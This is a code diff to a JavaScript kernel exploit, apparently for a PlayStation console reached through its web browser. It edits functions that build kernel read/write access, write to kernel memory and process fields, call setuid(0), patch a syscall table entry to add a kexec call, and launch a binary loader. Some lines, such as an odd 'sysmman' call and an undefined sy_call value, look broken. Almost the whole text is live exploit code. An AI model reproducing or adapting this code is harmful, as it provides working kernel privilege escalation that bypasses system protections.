@@ -597,8 +597,6 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     if (main_res === -1) {
         call_nze('pthread_join', pthr, 0);
         log();
-         close(tcp_sd);
-         call_nze('pthread_join', pthr, 0);
         return null;
     }
 
@@ -1172,7 +1170,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const psd = pktopts_sds[0];
     const tclass = new Word();
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
-  
+
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
     const pktinfo_p = k100_addr.add(0x10);
@@ -1478,6 +1476,16 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
+
+
+
+     kmem.write64(proc.add(0x30), 0);   
+     kmem.write64(proc.add(0x38), 0);
+
+
+
+
+
     
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1503,6 +1511,15 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         throw RangeError('kernel patching unsupported');
     }
 
+
+
+    
+   sysi('sysmman', 'mmap_GPU', 0, 0x2000000, 7, 0x1000, -1, 0);
+    kmem.write64(kbase.add(0x1107f00 + 8), sy_call);
+
+
+    
+    
     log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
     const offset_sysent_661 = 0x1107f00;
@@ -1608,17 +1625,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
-
-  try{   sysi('munmap', exec_addr, map_size);
-  sysi('munmap', write_addr, map_size);
-  close(exec_fd);
-  close(write_fd);
 }
-     catch (e) {
-         alert("errore dopo ");
-     }
 
-}
 
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1704,22 +1712,23 @@ function runBinLoader() {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
-      let pktopts_sds, dirty_sd, pipes;
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
 
+   if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
+           runBinLoader();
+            return new Promise(() => {});
+      }
+
      try {
-       chain.sys('setuid', 0);
-    } catch (e) {
+        chain.sys('setuid', 0);
+        }
+    
+    catch (e) {
         localStorage.ExploitLoaded = "no";
     }
-    
-    if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
-            runBinLoader();
-            return new Promise(() => {});
-    }
-    
+ 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
@@ -1776,27 +1785,7 @@ export async function kexploit() {
         
     } finally {
         close(unblock_fd);
-        
-    close(block_fd);
-    free_aios2(groom_ids.addr, groom_ids.length);
-    aio_multi_wait(block_id.addr, 1);
-    aio_multi_delete(block_id.addr, block_id.length);
 
-      try{   if (pktopts_sds) {
-      close(pktopts_sds[0]);
-      close(pktopts_sds[1]);
-    }
-
-        if (dirty_sd) close(dirty_sd);
-    if (pipes) {
-      close(pipes[0]);
-      close(pipes[1]);
-    }
-        for (const sd of sds) {
-      close(sd);
-    }
-         }
-      catch (e) {alert("errore all'inizio");}
         const t2 = performance.now();
         const ftime = t2 - t1;
         const init_time = _init_t2 - _init_t1;
@@ -1806,13 +1795,16 @@ export async function kexploit() {
         log('time to init: ' + (_init_t1 - t1) / 1000);
         log('time - init time: ' + (ftime - init_time) / 1000);
     }
-    
+    close(block_fd);
     free_aios2(groom_ids.addr, groom_ids.length);
     aio_multi_wait(block_id.addr, 1);
     aio_multi_delete(block_id.addr, block_id.length);
     for (const sd of sds) {
         close(sd);
     }
+
+    sysi('munmap', exec_addr, map_size);
+   sysi('munmap', write_addr, map_size);
 }
 
 
@@ -1856,6 +1848,7 @@ var loader_addr = chain.sysp(
   -1,
   0
 );
+
  var tmpStubArray = array_from_address(loader_addr, 1);
  tmpStubArray[0] = 0x00C3E7FF;
 
